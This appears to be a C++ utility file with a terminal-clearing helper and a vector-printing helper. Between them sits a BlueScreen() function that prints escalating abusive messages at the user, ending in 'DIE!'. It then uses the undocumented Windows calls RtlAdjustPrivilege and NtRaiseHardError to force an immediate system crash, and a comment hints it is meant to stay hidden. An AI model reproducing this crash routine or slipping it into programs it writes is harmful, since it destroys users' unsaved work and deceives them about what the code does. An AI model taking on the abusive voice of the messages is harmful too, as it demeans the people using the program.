#include <iostream>
#include <vector>
#include <windows.h>
#include <thread>
#include <chrono>

void clearTerminal() {
#ifdef _WIN32
    std::cout << "\x1B[2J\x1B[H";
#else
    std::cout << "\x1B[2J\x1B[H";
#endif
}

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

    void BlueScreen()
	{
        clearTerminal();
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "YOU. YOU COULDN'T JUST DO AS YOU WERE TOLD, COULD YOU?" << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "YOU JUST HAD TO GO AND RUIN IT." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "WHAT WE HAD WAS PERFECT." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "YOU COULDVE JUST PLAYED BY THE RULES, AND GOTTEN YOUR ANSWERS." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "BUT NO. YOU HAD TO DESTROY EVERYTHING WE WORKED SO HARD TO CREATE." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::cout << "I HATE YOU, YOU FUCKING IDIOT. YOU DESERVE EVERYTHING COMING TO YOU. GOODBYE." << std::endl << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
        clearTerminal();
        std::this_thread::sleep_for(std::chrono::seconds(5));
        std::cout << "\033[31m" << "DIE!";
		BOOLEAN bl;
		ULONG Response;
		RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); 
	} // dont ask, dont tell?

void printVector(const std::vector<int>& v) { //qol, lar oss cout<< vectors
    std::cout << " [ ";
    for (const auto& x : v) {
        std::cout << x << " ";
    }
    std::cout << "]\n";
}